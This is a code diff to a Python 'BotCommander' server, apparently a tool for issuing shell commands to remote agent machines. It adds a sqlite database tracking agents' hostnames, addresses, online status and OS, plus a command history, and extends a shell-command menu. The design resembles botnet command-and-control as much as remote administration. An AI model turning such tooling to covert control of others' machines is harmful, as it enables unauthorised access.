@@ -1,6 +1,7 @@
 import os
 import json
 import asyncio
+import sqlite3
 import configparser
 from pathlib import Path
 from logger import CoreLogger
@@ -30,6 +31,10 @@ def load_conf():
 
 class BotCommander:
     def __init__(self, host, port, offline_tout, cmd_tout):
+        self.base_path = "/opt/commander"
+        self.db_path = f"{self.base_path}/db"
+        self.db_name = "commander.db"
+        self.__db_check()
         self.uuids = {}
         self.sent = 0
         self.fail = 0
@@ -42,6 +47,22 @@ class BotCommander:
         loop.create_task(self.__process_user_input())
         loop.create_task(self.__server_run())
         loop.run_forever()
+
+    def __db_check(self):
+        self.db_fp = os.path.join(self.db_path, self.db_name)
+        if os.path.isfile(self.db_fp):
+            logger.core.info("Database commander.db was found in /opt/commander/db, will use it")
+        else:
+            logger.core.info("Database commander.db was not found in /opt/commander/db, creating new database")
+            self.__db_create()
+
+    def __db_create(self):
+        con = sqlite3.connect(self.db_fp)
+        cur = con.cursor()
+        cur.executescript('''
+        CREATE TABLE BotAgents(id TEXT PRIMARY KEY, hostname TEXT, address TEXT, online INTEGER, os TEXT);
+        CREATE TABLE CommandHistory(id TEXT, time TEXT, command TEXT, FOREIGN KEY (id) REFERENCES BotAgents (id));
+        ''')
 
     @staticmethod
     def __print_help():
@@ -175,7 +196,7 @@ class BotCommander:
     async def __exec_shell_cmd(self):
         while True:
             self.__print_cmd_options()
-            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
+            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
             try:
                 val = int(choice)
